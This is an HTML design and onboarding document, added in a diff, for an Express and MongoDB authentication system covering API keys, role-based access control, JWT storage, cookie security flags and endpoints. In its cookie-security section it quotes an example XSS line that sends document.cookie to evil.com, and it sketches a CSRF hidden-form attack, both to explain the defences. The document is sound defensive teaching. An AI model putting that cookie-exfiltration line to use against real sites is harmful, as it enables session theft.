+  <div class="page-footer">Made by Nikhil Mahato (Software Development Engineer 1)</div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════ PAGE 7: API KEY -->
+<div class="page">
+  <div class="page-header"><span>Auth System — BRD &amp; System Design</span><span>Section 4 · API Key System</span></div>
+  <h1>4. API Key System</h1>
+
+  <h2>4.1 Why API Keys + JWT Together?</h2>
+  <p>Using <strong>both</strong> JWT and an API key provides <em>two-factor API authentication</em>:</p>
+  <table>
+    <tr><th>Layer</th><th>What it proves</th><th>Can it be stolen alone?</th></tr>
+    <tr><td>JWT Token</td><td>"This is user X, with role Y"</td><td>Yes — XSS can steal cookies/localStorage</td></tr>
+    <tr><td>API Key</td><td>"The caller is a known application/integration"</td><td>Yes — leaked in code or network logs</td></tr>
+    <tr><td><strong>Both together</strong></td><td>"This is user X using the correct application"</td><td>Attacker needs to steal BOTH simultaneously</td></tr>
+  </table>
+  <p>This pattern is used by companies like Stripe, Twilio, and SendGrid — your API key identifies the client app; your JWT identifies the user.</p>
+
+  <h2>4.2 Bootstrap Flow — Creating the First API Key</h2>
+  <p>There is a chicken-and-egg problem: to call any protected endpoint you need an API key, but to create an API key you need to call <code>POST /api-keys</code> (which is protected). The solution is a <strong>bootstrap key</strong> stored in <code>.env</code>:</p>
+
+  <div class="flow">
+    <div class="flow-box">Run seed-admin.ts</div>
+    <div class="flow-arrow">→</div>
+    <div class="flow-box green">Get JWT token printed in terminal</div>
+  </div>
+  <div style="margin: 8px 0"></div>
+  <div class="flow">
+    <div class="flow-box">POST /api-keys</div>
+    <div class="flow-arrow">→</div>
+    <div class="flow-box red">authMiddleware (JWT)</div>
+    <div class="flow-arrow">→</div>
+    <div class="flow-box red">envApiKeyMiddleware<br/><small>FOR_API_KEY_CREATE_KEY from .env</small></div>
+    <div class="flow-arrow">→</div>
+    <div class="flow-box green">DB key created, returned ONCE</div>
+  </div>
+  <div style="margin: 8px 0"></div>
+  <div class="flow">
+    <div class="flow-box">All other endpoints</div>
+    <div class="flow-arrow">→</div>
+    <div class="flow-box red">authMiddleware (JWT)</div>
+    <div class="flow-arrow">→</div>
+    <div class="flow-box red">apiKeyMiddleware<br/><small>key from DB</small></div>
+    <div class="flow-arrow">→</div>
+    <div class="flow-box green">Proceed</div>
+  </div>
+
+  <div class="callout warn">
+    <div class="callout-title">Production Checklist</div>
+    After creating your first DB API key: change <code>FOR_API_KEY_CREATE_KEY</code> in .env to a new value (or set it to a very long random string). This prevents anyone who sees the old bootstrap key from creating more keys.
+  </div>
+
+  <h2>4.3 Usage Limit &amp; Expiry Logic</h2>
+
+  <pre><span class="comment">// Middleware checks in order:</span>
+
+<span class="keyword">if</span> (!record.is_active)           → <span class="string">401</span> <span class="string">"API key is inactive"</span>
+<span class="keyword">if</span> (record.expires_at &lt; now)      → <span class="string">401</span> <span class="string">"API key has expired"</span>
+<span class="keyword">if</span> (usage_count &gt;= usage_limit)   → <span class="string">429</span> <span class="string">"API key usage limit exceeded"</span>
+<span class="comment">// usage_limit === -1 means unlimited (skip the check)</span>
+
+<span class="comment">// On success: atomically increment the counter</span>
+<span class="keyword">await</span> ApiKey.<span class="fn">updateOne</span>({ _id }, { <span class="prop">$inc</span>: { <span class="prop">usage_count</span>: <span class="string">1</span> } });</pre>
+
+  <table>
+    <tr><th>Field</th><th>Example</th><th>Behavior</th></tr>
+    <tr><td><code>usage_limit: 1000</code></td><td>POST with 1000 usages</td><td>Key stops working after 1000 requests</td></tr>
+    <tr><td><code>usage_limit: -1</code></td><td>Unlimited key</td><td>Usage count tracked but never blocks</td></tr>
+    <tr><td><code>expires_at: "2026-12-31"</code></td><td>Year-end expiry</td><td>Key auto-rejects from Jan 1, 2027 onward</td></tr>
+    <tr><td><code>is_active: false</code></td><td>Revoked key</td><td>Instant revocation — no waiting for expiry</td></tr>
+  </table>
+
+  <div class="page-footer">Made by Nikhil Mahato (Software Development Engineer 1)</div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════ PAGE 8: RBAC -->
+<div class="page">
+  <div class="page-header"><span>Auth System — BRD &amp; System Design</span><span>Section 5 · RBAC</span></div>
+  <h1>5. RBAC — Role-Based Access Control</h1>
+
+  <h2>5.1 Concept Explained (for Beginners)</h2>
+  <p>RBAC answers the question: <em>"User X is logged in. Can they do action Y on module Z?"</em></p>
+  <p>Instead of assigning permissions directly to each user (which does not scale), permissions are assigned to <strong>Roles</strong>. Each user has one role. When the user's role changes, all their permissions change automatically.</p>
+
+  <pre><span class="comment">// Role: "editor" — can view and edit users, but cannot delete</span>
+{
+  <span class="prop">role_name</span>: <span class="string">"editor"</span>,
+  <span class="prop">role_access</span>: [
+    { <span class="prop">module_id</span>: <span class="string">"user_management"</span>, <span class="prop">create</span>: <span class="keyword">false</span>, <span class="prop">edit</span>: <span class="keyword">true</span>, <span class="prop">view</span>: <span class="keyword">true</span>, <span class="prop">delete</span>: <span class="keyword">false</span>, <span class="prop">transfer</span>: <span class="keyword">false</span>, <span class="prop">export</span>: <span class="keyword">true</span> },
+    { <span class="prop">module_id</span>: <span class="string">"marks_management"</span>, <span class="prop">create</span>: <span class="keyword">true</span>,  <span class="prop">edit</span>: <span class="keyword">true</span>, <span class="prop">view</span>: <span class="keyword">true</span>, <span class="prop">delete</span>: <span class="keyword">false</span>, <span class="prop">transfer</span>: <span class="keyword">false</span>, <span class="prop">export</span>: <span class="keyword">true</span> },
+  ]
+}</pre>
+
+  <h2>5.2 Permission Middleware — 3 Gates Explained</h2>
+
+  <pre><span class="fn">requirePermission</span>(<span class="string">'user_management'</span>, <span class="string">'delete'</span>)
+<span class="comment">// Usage in route: router.delete('/:id', authMiddleware, apiKeyMiddleware,
+//                   requirePermission('user_management','delete'), deleteUser);</span>
+
+<span class="comment">// ── Gate 1: Is the role valid? ─────────────────────────────────────────</span>
+<span class="keyword">const</span> <span class="prop">role</span> = <span class="keyword">await</span> Role.<span class="fn">findById</span>(req.user.role_id);
+<span class="keyword">if</span> (!role || !role.is_active)
+  → <span class="string">403</span> <span class="string">"Your assigned role has been deactivated"</span>
+
+<span class="comment">// ── Gate 2: Does this role have any access to the module? ──────────────</span>
+<span class="keyword">const</span> <span class="prop">moduleAccess</span> = role.role_access.<span class="fn">find</span>(e => e.module_id === <span class="string">'user_management'</span>);
+<span class="keyword">if</span> (!moduleAccess)
+  → <span class="string">403</span> <span class="string">"You do not have access to the 'user_management' module"</span>
+
+<span class="comment">// ── Gate 3: Is the specific action allowed? ────────────────────────────</span>
+<span class="keyword">if</span> (!moduleAccess[<span class="string">'delete'</span>])
+  → <span class="string">403</span> <span class="string">"You do not have 'delete' permission on the 'user_management' module"</span>
+
+<span class="comment">// All gates passed → next() → controller runs</span></pre>
+
+  <div class="callout info">
+    <div class="callout-title">Why read from DB, not from the JWT?</div>
+    The JWT contains <code>role_id</code>, NOT the full role_access array. This is intentional. If we embedded permissions in the JWT, a permission change by the admin would not take effect until the user's token expires (up to 7 days). By reading the role from DB on every request, permission changes take effect immediately — on the very next API call.
+  </div>
+
+  <h2>5.3 Module Access Matrix Example</h2>
+  <table>
+    <tr><th>Module</th><th>super_admin</th><th>editor</th><th>viewer</th><th>student_manager</th></tr>
+    <tr><td>user_management</td><td>✅ All</td><td>view, edit, export</td><td>view only</td><td>❌ No access</td></tr>
+    <tr><td>role_management</td><td>✅ All</td><td>view only</td><td>❌ No access</td><td>❌ No access</td></tr>
+    <tr><td>module_management</td><td>✅ All</td><td>❌ No access</td><td>❌ No access</td><td>❌ No access</td></tr>
+    <tr><td>student_management</td><td>✅ All</td><td>view, edit</td><td>view only</td><td>✅ All</td></tr>
+    <tr><td>marks_management</td><td>✅ All</td><td>view, edit, export</td><td>view only</td><td>✅ All</td></tr>
+    <tr><td>api_key_management</td><td>✅ All</td><td>❌ No access</td><td>❌ No access</td><td>❌ No access</td></tr>
+  </table>
+
+  <h3>How to add a new route with permission check</h3>
+  <pre><span class="comment">// 1. Decide which module and which action</span>
+<span class="comment">// 2. Add to route file:</span>
+router.<span class="fn">post</span>(<span class="string">'/export'</span>,
+  authMiddleware,
+  apiKeyMiddleware,
+  <span class="fn">requirePermission</span>(<span class="string">'marks_management'</span>, <span class="string">'export'</span>),  <span class="comment">// ← just this line</span>
+  exportMarksController
+);
+<span class="comment">// 3. No other file needs to change. The role in the DB controls who can use it.</span></pre>
+
+  <div class="page-footer">Made by Nikhil Mahato (Software Development Engineer 1)</div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════ PAGE 9: FRONTEND GUIDE -->
+<div class="page">
+  <div class="page-header"><span>Auth System — BRD &amp; System Design</span><span>Section 6 · Frontend Integration</span></div>
+  <h1>6. Frontend Integration Guide</h1>
+
+  <h2>6.1 Login Flow from Frontend (React example)</h2>
+  <div class="flow">
+    <div class="flow-box">User types email + password on Login Page</div>
+    <div class="flow-arrow">→</div>
+    <div class="flow-box">POST /api/v1/auth/login</div>
+    <div class="flow-arrow">→</div>
+    <div class="flow-box green">Server returns { token, user }</div>
+  </div>
+  <div style="margin:8px 0"></div>
+  <div class="flow">
+    <div class="flow-box">Store JWT securely (see 6.2)</div>
+    <div class="flow-arrow">→</div>
+    <div class="flow-box">Redirect to Dashboard</div>
+    <div class="flow-arrow">→</div>
+    <div class="flow-box">All API calls send JWT + API key</div>
+  </div>
+
+<pre><span class="comment">// React login function (Axios example)</span>
+<span class="keyword">async function</span> <span class="fn">loginUser</span>(email, password) {
+  <span class="keyword">const</span> res = <span class="keyword">await</span> axios.<span class="fn">post</span>(<span class="string">'/api/v1/auth/login'</span>, { email, password });
+  <span class="keyword">const</span> { token, user } = res.data.data;
+
+  <span class="comment">// Option A: Store in HttpOnly cookie (set by server — most secure)</span>
+  <span class="comment">// Option B: Store token in Redux + memory (good for SPAs)</span>
+  <span class="comment">// See Section 6.2 for full comparison</span>
+
+  <span class="comment">// Set Axios default headers for future requests</span>
+  axios.defaults.headers.common[<span class="string">'Authorization'</span>] = <span class="string">`Bearer <span class="prop">${token}</span>`</span>;
+  axios.defaults.headers.common[<span class="string">'x-api-key'</span>] = <span class="string">process.env.REACT_APP_API_KEY</span>;
+
+  <span class="comment">// Store user info (not token) in Redux for UI purposes</span>
+  dispatch(<span class="fn">setUser</span>(user));
+  navigate(<span class="string">'/dashboard'</span>);
+}</pre>
+
+  <h2>6.2 JWT Storage — Cookies vs Redux vs localStorage</h2>
+  <table>
+    <tr><th>Method</th><th>Where stored</th><th>XSS Safe?</th><th>CSRF Risk?</th><th>Survives refresh?</th><th>Recommendation</th></tr>
+    <tr>
+      <td><strong>HttpOnly Cookie</strong></td>
+      <td>Browser cookie (JS cannot read)</td>
+      <td><span class="badge green">✅ Yes</span></td>
+      <td><span class="badge red">⚠️ Yes (need CSRF token)</span></td>
+      <td><span class="badge green">✅ Yes</span></td>
+      <td><span class="badge green">Best for auth tokens</span></td>
+    </tr>
+    <tr>
+      <td><strong>Redux (memory only)</strong></td>
+      <td>JavaScript memory</td>
+      <td><span class="badge green">✅ Yes</span></td>
+      <td><span class="badge green">✅ No</span></td>
+      <td><span class="badge red">❌ No (lost on refresh)</span></td>
+      <td><span class="badge blue">Good + pair with refresh token cookie</span></td>
+    </tr>
+    <tr>
+      <td><strong>localStorage</strong></td>
+      <td>Browser storage (JS can read)</td>
+      <td><span class="badge red">❌ No</span></td>
+      <td><span class="badge green">✅ No</span></td>
+      <td><span class="badge green">✅ Yes</span></td>
+      <td><span class="badge red">AVOID for tokens</span></td>
+    </tr>
+    <tr>
+      <td><strong>sessionStorage</strong></td>
+      <td>Browser storage (tab only)</td>
+      <td><span class="badge red">❌ No</span></td>
+      <td><span class="badge green">✅ No</span></td>
+      <td><span class="badge red">❌ No (lost on tab close)</span></td>
+      <td><span class="badge orange">OK for non-sensitive short sessions</span></td>
+    </tr>
+  </table>
+
+  <div class="callout warn">
+    <div class="callout-title">⚠️ Never store JWT in localStorage</div>
+    localStorage is accessible by any JavaScript on your page. If an attacker injects malicious JavaScript (XSS attack), they can run <code>localStorage.getItem('token')</code> and steal your JWT. An HttpOnly cookie cannot be read by JavaScript at all — even if XSS is executed.
+  </div>
+
+  <h3>Recommended pattern: HttpOnly cookie (server-side set)</h3>
+  <p>When the server calls <code>res.cookie()</code> with the right flags, the browser stores the token automatically and sends it on every request — the frontend JavaScript never touches the token value:</p>
+
+<pre><span class="comment">// In auth controller (Express side)</span>
+res.<span class="fn">cookie</span>(<span class="string">'jwt_token'</span>, token, {
+  httpOnly: <span class="keyword">true</span>,   <span class="comment">// JS cannot read this cookie — prevents XSS token theft</span>
+  secure:   <span class="keyword">true</span>,   <span class="comment">// Only sent over HTTPS — prevents network sniffing</span>
+  sameSite: <span class="string">'strict'</span>, <span class="comment">// Not sent on cross-site requests — prevents CSRF</span>
+  maxAge:   <span class="string">7 * 24 * 60 * 60 * 1000</span>, <span class="comment">// 7 days in ms</span>
+  path:     <span class="string">'/'</span>,
+});
+
+<span class="comment">// Frontend just calls the API — no need to manually attach the token!</span>
+<span class="comment">// The browser sends the cookie automatically with every request to the domain.</span></pre>
+
+  <div class="page-footer">Made by Nikhil Mahato (Software Development Engineer 1)</div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════ PAGE 10: COOKIE SECURITY -->
+<div class="page">
+  <div class="page-header"><span>Auth System — BRD &amp; System Design</span><span>Section 6.3–6.5 · Cookie Security &amp; Hijacking Prevention</span></div>
+  <h1>6.3 Cookie Security Flags — Explained</h1>
+
+  <table>
+    <tr><th>Flag</th><th>What it does</th><th>Without it...</th></tr>
+    <tr>
+      <td><code>HttpOnly</code></td>
+      <td>The cookie cannot be accessed by JavaScript (<code>document.cookie</code> won't show it)</td>
+      <td>XSS script can do <code>fetch('evil.com?t='+document.cookie)</code> and exfiltrate the token</td>
+    </tr>
+    <tr>
+      <td><code>Secure</code></td>
+      <td>Cookie is only sent over HTTPS connections</td>
+      <td>Cookie sent in plain HTTP — visible to anyone on the same network (coffee shop WiFi attack)</td>
+    </tr>
+    <tr>
+      <td><code>SameSite=Strict</code></td>
+      <td>Cookie is NOT sent when the request originates from a different domain</td>
+      <td>CSRF attack: evil.com tricks your browser into sending a request to yourapp.com WITH your cookie</td>
+    </tr>
+    <tr>
+      <td><code>SameSite=Lax</code></td>
+      <td>Cookie sent on same-site requests + top-level navigation (clicking a link). Not sent on cross-site POST.</td>
+      <td>Some CSRF scenarios still possible</td>
+    </tr>
+    <tr>
+      <td><code>maxAge / expires</code></td>
+      <td>Cookie auto-deletes after this time</td>
+      <td>Cookie persists forever in browser (session cookie disappears on browser close only)</td>
+    </tr>
+    <tr>
+      <td><code>path='/'</code></td>
+      <td>Cookie sent with all paths under the domain</td>
+      <td>Cookie only sent for the specific path it was set on</td>
+    </tr>
+  </table>
+
+  <h1>6.4 Cookie Stealing &amp; Session Hijacking — Prevention</h1>
+
+  <h2>Attack 1: XSS (Cross-Site Scripting)</h2>
+  <div class="callout danger">
+    <div class="callout-title">🔴 How the attack works</div>
+    Attacker injects malicious JavaScript into your page (e.g., via an unescaped comment field). The script runs in the victim's browser and reads the JWT from <code>localStorage</code> or a non-HttpOnly cookie, then sends it to the attacker's server.
+  </div>
+  <table>
+    <tr><th>Prevention</th><th>Implementation</th></tr>
+    <tr><td>Use HttpOnly cookies for JWT</td><td>JS cannot read the cookie at all</td></tr>
+    <tr><td>Never store tokens in localStorage</td><td>localStorage is fully JS-accessible</td></tr>
+    <tr><td>Sanitize all user input</td><td>Use a library like DOMPurify on the frontend, Joi on the backend</td></tr>
+    <tr><td>Content Security Policy header</td><td><code>helmet()</code> middleware in Express sets CSP headers automatically</td></tr>
+    <tr><td>Escape HTML output</td><td>React escapes by default — never use <code>dangerouslySetInnerHTML</code> with untrusted data</td></tr>
+  </table>
+
+  <h2>Attack 2: CSRF (Cross-Site Request Forgery)</h2>
+  <div class="callout danger">
+    <div class="callout-title">🔴 How the attack works</div>
+    You are logged into yourbank.com. You visit evil.com which has a hidden form: <code>&lt;form action="yourbank.com/transfer" method="POST"&gt;</code>. When it auto-submits, YOUR browser sends your session cookie to yourbank.com — the bank thinks YOU made the transfer.
+  </div>
+  <table>
+    <tr><th>Prevention</th><th>Implementation</th></tr>
+    <tr><td><code>SameSite=Strict</code> cookie flag</td><td>Browser refuses to send the cookie on cross-site requests</td></tr>
+    <tr><td>CSRF Token (Double Submit Cookie)</td><td>Server generates a random token, sends it in a non-HttpOnly cookie AND expects it in a request header. Attacker cannot read the cookie to forge the header.</td></tr>
+    <tr><td>Check Origin / Referer header</td><td>Reject requests where Origin doesn't match your domain</td></tr>
+    <tr><td>Our API key requirement</td><td>Since every request needs <code>x-api-key</code> header, CSRF form submissions (which cannot set custom headers) will always fail with 401</td></tr>
+  </table>
+
+  <div class="callout tip">
+    <div class="callout-title">💡 Our x-api-key header is a natural CSRF defense</div>
+    HTML forms and CSRF attacks cannot set custom HTTP headers. Since every one of our API endpoints requires <code>x-api-key</code> in the header, a CSRF attack will always be blocked by the API key middleware — even if SameSite is not set on the cookie.
+  </div>
+
+  <h2>Attack 3: Man-in-the-Middle (Network Sniffing)</h2>
+  <div class="callout danger">
+    <div class="callout-title">🔴 How the attack works</div>
+    On an unsecured WiFi network, an attacker intercepts HTTP traffic and reads the JWT from the request headers or cookie.
+  </div>
+  <table>
+    <tr><th>Prevention</th><th>Implementation</th></tr>
+    <tr><td>Always use HTTPS in production</td><td>TLS encrypts the entire HTTP payload including all headers and cookies</td></tr>
+    <tr><td><code>Secure</code> cookie flag</td><td>Browser refuses to send the cookie over HTTP — only HTTPS</td></tr>
+    <tr><td>HSTS header</td><td><code>helmet()</code> sets <code>Strict-Transport-Security</code> — browser remembers to always use HTTPS</td></tr>
+  </table>
+
+  <h2>Attack 4: JWT Token Theft (Stolen from Memory)</h2>
+  <div class="callout danger">
+    <div class="callout-title">🔴 How the attack works</div>
+    If the JWT is stored in a Redux store or JavaScript variable, a browser extension, a dependency with malicious code, or a sophisticated XSS can read it from memory.
+  </div>
+  <table>
+    <tr><th>Prevention</th><th>Implementation</th></tr>
+    <tr><td>Short token expiry (15 min)</td><td>Stolen token becomes useless quickly</td></tr>
+    <tr><td>Refresh token rotation</td><td>Each use of the refresh token issues a new one — old ones are invalidated</td></tr>
+    <tr><td>DB revocation list</td><td>Maintain a blocklist of revoked token IDs (jti claim) — check on every request</td></tr>
+    <tr><td>Our is_active check</td><td>If you suspect theft, admin sets user <code>is_active: false</code> → all requests blocked immediately, regardless of token validity</td></tr>
+  </table>
+
+  <h2>6.5 Protected Routes in React</h2>
+<pre><span class="comment">// ProtectedRoute component</span>
+<span class="keyword">function</span> <span class="fn">ProtectedRoute</span>({ children }) {
+  <span class="keyword">const</span> user = <span class="fn">useSelector</span>(state => state.auth.user);  <span class="comment">// from Redux</span>
+
+  <span class="keyword">if</span> (!user) <span class="keyword">return</span> &lt;<span class="fn">Navigate</span> to=<span class="string">"/login"</span> replace /&gt;;
+  <span class="keyword">return</span> children;
+}
+
+<span class="comment">// Check module permission before rendering</span>
+<span class="keyword">function</span> <span class="fn">PermissionGuard</span>({ moduleId, action, children }) {
+  <span class="keyword">const</span> role = <span class="fn">useSelector</span>(state => state.auth.user?.role);
+  <span class="keyword">const</span> access = role?.role_access.<span class="fn">find</span>(a => a.module_id === moduleId);
+  <span class="keyword">if</span> (!access?.[action]) <span class="keyword">return</span> &lt;<span class="fn">AccessDenied</span> /&gt;;
+  <span class="keyword">return</span> children;
+}
+
+<span class="comment">// Usage in App router</span>
+&lt;<span class="fn">Route</span> path=<span class="string">"/dashboard"</span> element={
+  &lt;<span class="fn">ProtectedRoute</span>&gt;
+    &lt;<span class="fn">PermissionGuard</span> moduleId=<span class="string">"user_management"</span> action=<span class="string">"view"</span>&gt;
+      &lt;<span class="fn">UsersPage</span> /&gt;
+    &lt;/<span class="fn">PermissionGuard</span>&gt;
+  &lt;/<span class="fn">ProtectedRoute</span>&gt;
+} /&gt;</pre>
+
+  <div class="callout warn">
+    <div class="callout-title">Frontend permission checks are UI hints only</div>
+    Hiding a button or route in React prevents accidental access but does NOT prevent a determined attacker from calling the API directly (e.g., via Postman). The <strong>real</strong> security is the <code>requirePermission</code> middleware on the backend. Always enforce permissions on BOTH sides.
+  </div>
+
+  <div class="page-footer">Made by Nikhil Mahato (Software Development Engineer 1)</div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════ PAGE 11: SECURITY BEST PRACTICES -->
+<div class="page">
+  <div class="page-header"><span>Auth System — BRD &amp; System Design</span><span>Section 7 · Security Best Practices</span></div>
+  <h1>7. Security Best Practices</h1>
+
+  <h2>Backend Checklist</h2>
+  <table>
+    <tr><th>#</th><th>Practice</th><th>Implementation in this project</th></tr>
+    <tr><td>1</td><td>Hash passwords with bcrypt, salt rounds ≥ 10</td><td><code>bcrypt.hash(password, 12)</code> — salt rounds = 12</td></tr>
+    <tr><td>2</td><td>Never return password in API response</td><td>Aggregation pipeline uses <code>{ $project: { password: 0 } }</code></td></tr>
+    <tr><td>3</td><td>Same error for wrong email and wrong password</td><td>"Invalid email or password" — prevents user enumeration</td></tr>
+    <tr><td>4</td><td>Validate all input at the HTTP boundary</td><td>Joi schemas in every controller before use-case is called</td></tr>
+    <tr><td>5</td><td>Use helmet() for security headers</td><td>Configured in <code>app.ts</code> — sets X-Frame-Options, CSP, HSTS etc.</td></tr>
+    <tr><td>6</td><td>CORS whitelist (not wildcard *)</td><td>Only <code>localhost:5173</code> and <code>succely.in</code> allowed</td></tr>
+    <tr><td>7</td><td>Rate limiting (future)</td><td>Recommended: <code>express-rate-limit</code> on /auth/login — max 5 attempts/min</td></tr>
+    <tr><td>8</td><td>JWT secret must be long and random</td><td>Change <code>JWT_SECRET</code> in .env to 64+ random chars in production</td></tr>
+    <tr><td>9</td><td>Never commit .env to git</td><td>.env is in .gitignore</td></tr>
+    <tr><td>10</td><td>Use HTTPS in production</td><td>Enforce via server config (Nginx/Caddy) or cloud provider</td></tr>
+    <tr><td>11</td><td>MongoDB injection protection</td><td>Mongoose sanitizes queries by default. Never use raw <code>$where</code> with user input.</td></tr>
+    <tr><td>12</td><td>Deactivation takes effect immediately</td><td><code>authMiddleware</code> does a live DB check for <code>is_active</code> on every request</td></tr>
+  </table>
+
+  <h2>Environment Variables — Production Minimum</h2>
+<pre><span class="comment"># .env — production minimum (change ALL values)</span>
+<span class="prop">PORT</span>=<span class="string">7000</span>
+<span class="prop">MONGO_URI</span>=<span class="string">mongodb+srv://user:strongpassword@cluster.mongodb.net/prod_db</span>
+<span class="prop">NODE_ENV</span>=<span class="string">production</span>
+<span class="prop">JWT_SECRET</span>=<span class="string">a8f3b2c1d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5z6A7B8C9D0E1</span>
+<span class="prop">JWT_EXPIRES_IN</span>=<span class="string">15m</span>   <span class="comment"># short in production + use refresh tokens</span>
+<span class="prop">FOR_API_KEY_CREATE_KEY</span>=<span class="string">rotate-this-after-first-key-is-created</span></pre>
+
+  <h2>What Happens If the JWT Secret Leaks?</h2>
+  <div class="callout danger">
+    <div class="callout-title">🚨 Critical Incident Response</div>
+    <ol style="margin-left:16px">
+      <li>Immediately change <code>JWT_SECRET</code> in .env and restart the server</li>
+      <li>All existing tokens become invalid instantly — all users will be logged out</li>
+      <li>Optionally: set all user accounts to <code>is_active: false</code> and force re-verification</li>
+      <li>Audit logs to check if the secret was used to generate unauthorized tokens</li>
+      <li>Rotate the API keys created during the breach period</li>
+    </ol>
+  </div>
+
+  <h2>MongoDB Security</h2>
+  <table>
+    <tr><th>Risk</th><th>Prevention</th></tr>
+    <tr><td>Brute-force login</td><td>Rate limit <code>POST /auth/login</code> (express-rate-limit). Lock account after N failures.</td></tr>
+    <tr><td>Injection via query params</td><td>Mongoose escapes values automatically when using typed schemas. Avoid <code>req.query</code> directly in <code>find()</code> without sanitization.</td></tr>
+    <tr><td>Data exposure</td><td>Always project out sensitive fields: <code>{ password: 0 }</code>. Use <code>.select('-password')</code> when fetching users.</td></tr>
+    <tr><td>Unauthorized DB access</td><td>MongoDB Atlas: enable IP whitelist, use strong credentials, rotate them regularly.</td></tr>
+  </table>
+
+  <div class="page-footer">Made by Nikhil Mahato (Software Development Engineer 1)</div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════ PAGE 12: API REFERENCE -->
+<div class="page">
+  <div class="page-header"><span>Auth System — BRD &amp; System Design</span><span>Section 8 · API Endpoint Reference</span></div>
+  <h1>8. API Endpoint Reference</h1>
+  <p>Base URL: <code>http://localhost:7000/api/v1</code> &nbsp;|&nbsp; Full docs: <code>http://localhost:7000/api-docs</code></p>
+
+  <h2>Auth</h2>
+  <table>
+    <tr><th>Method</th><th>Endpoint</th><th>Auth</th><th>Description</th></tr>
+    <tr><td><span class="badge green">POST</span></td><td><code>/auth/login</code></td><td>None</td><td>Login with email + password → JWT token</td></tr>
+    <tr><td><span class="badge blue">GET</span></td><td><code>/auth/profile</code></td><td>JWT only</td><td>Get current user's profile with role details</td></tr>
+  </table>
+
+  <h2>API Keys</h2>
+  <table>
+    <tr><th>Method</th><th>Endpoint</th><th>Auth</th><th>Description</th></tr>
+    <tr><td><span class="badge green">POST</span></td><td><code>/api-keys</code></td><td>JWT + <strong>.env key</strong></td><td>Create API key. Pass usage_limit + expires_at in body.</td></tr>
+    <tr><td><span class="badge blue">GET</span></td><td><code>/api-keys</code></td><td>JWT + DB key</td><td>List all API keys for current user</td></tr>
+    <tr><td><span class="badge blue">GET</span></td><td><code>/api-keys/:id</code></td><td>JWT + DB key</td><td>Get a single API key</td></tr>
+    <tr><td><span class="badge orange">PATCH</span></td><td><code>/api-keys/:id</code></td><td>JWT + DB key</td><td>Update name, is_active, usage_limit, expires_at</td></tr>
+    <tr><td><span class="badge red">DELETE</span></td><td><code>/api-keys/:id</code></td><td>JWT + DB key</td><td>Soft-deactivate the key</td></tr>
+  </table>
+
+  <h2>Users, Roles, Modules (all require JWT + DB key + permission)</h2>
+  <table>
+    <tr><th>Method</th><th>Endpoint</th><th>Permission required</th></tr>
+    <tr><td><span class="badge blue">GET</span></td><td><code>/users</code></td><td>user_management → view</td></tr>
+    <tr><td><span class="badge green">POST</span></td><td><code>/users</code></td><td>user_management → create</td></tr>
+    <tr><td><span class="badge orange">PATCH</span></td><td><code>/users/:id</code></td><td>user_management → edit</td></tr>
+    <tr><td><span class="badge red">DELETE</span></td><td><code>/users/:id</code></td><td>user_management → delete</td></tr>
+    <tr><td><span class="badge blue">GET</span></td><td><code>/roles</code></td><td>role_management → view</td></tr>
+    <tr><td><span class="badge green">POST</span></td><td><code>/roles</code></td><td>role_management → create</td></tr>
+    <tr><td><span class="badge orange">PATCH</span></td><td><code>/roles/:id</code></td><td>role_management → edit</td></tr>
+    <tr><td><span class="badge red">DELETE</span></td><td><code>/roles/:id</code></td><td>role_management → delete</td></tr>
+    <tr><td><span class="badge blue">GET</span></td><td><code>/modules</code></td><td>module_management → view</td></tr>
+    <tr><td><span class="badge green">POST</span></td><td><code>/modules</code></td><td>module_management → create</td></tr>
+    <tr><td><span class="badge orange">PATCH</span></td><td><code>/modules/:id</code></td><td>module_management → edit</td></tr>
+    <tr><td><span class="badge red">DELETE</span></td><td><code>/modules/:id</code></td><td>module_management → delete</td></tr>
+    <tr><td><span class="badge blue">GET</span></td><td><code>/students</code></td><td>student_management → view</td></tr>
+    <tr><td><span class="badge green">POST</span></td><td><code>/students</code></td><td>student_management → create</td></tr>
+    <tr><td><span class="badge orange">PATCH</span></td><td><code>/students/:id</code></td><td>student_management → edit</td></tr>
+    <tr><td><span class="badge red">DELETE</span></td><td><code>/students/:id</code></td><td>student_management → delete</td></tr>
+    <tr><td><span class="badge blue">GET</span></td><td><code>/marks</code></td><td>marks_management → view</td></tr>
+    <tr><td><span class="badge green">POST</span></td><td><code>/marks</code></td><td>marks_management → create</td></tr>
+    <tr><td><span class="badge orange">PATCH</span></td><td><code>/marks/:id</code></td><td>marks_management → edit</td></tr>
+    <tr><td><span class="badge red">DELETE</span></td><td><code>/marks/:id</code></td><td>marks_management → delete</td></tr>
+  </table>
+
+  <h2>Standard Response Envelope</h2>
+<pre><span class="comment">// Success</span>
+{ <span class="prop">"success"</span>: <span class="keyword">true</span>, <span class="prop">"message"</span>: <span class="string">"Users fetched successfully"</span>, <span class="prop">"data"</span>: { ... } }
+
+<span class="comment">// Error</span>
+{ <span class="prop">"success"</span>: <span class="keyword">false</span>, <span class="prop">"message"</span>: <span class="string">"Validation failed"</span>, <span class="prop">"errors"</span>: [<span class="string">"email must be valid"</span>] }
+
+<span class="comment">// Status codes used</span>
+<span class="string">200</span> OK          → Fetch / Update success
+<span class="string">201</span> Created     → Resource created
+<span class="string">400</span> Bad Request → Joi validation failed
+<span class="string">401</span> Unauthorized → JWT invalid/expired/account inactive / bad API key
+<span class="string">403</span> Forbidden   → Valid user but missing permission
+<span class="string">404</span> Not Found   → Resource does not exist
+<span class="string">409</span> Conflict    → Duplicate (email, module_id, role_name)
+<span class="string">429</span> Too Many    → API key usage limit exceeded
+<span class="string">500</span> Server Error → Unhandled exception</pre>
+
+  <div class="page-footer">Made by Nikhil Mahato (Software Development Engineer 1)</div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════ PAGE 13: FOLDER STRUCTURE -->
+<div class="page">
+  <div class="page-header"><span>Auth System — BRD &amp; System Design</span><span>Section 9 · Folder Structure &amp; Developer Guide</span></div>
+  <h1>9. Folder Structure &amp; Developer Guide</h1>
+
+  <pre><span class="prop">Backend/</span>
+<span class="prop">├── src/</span>
+<span class="prop">│   ├── app.ts</span>                  <span class="comment">← Express app: CORS, helmet, routes, error handler</span>
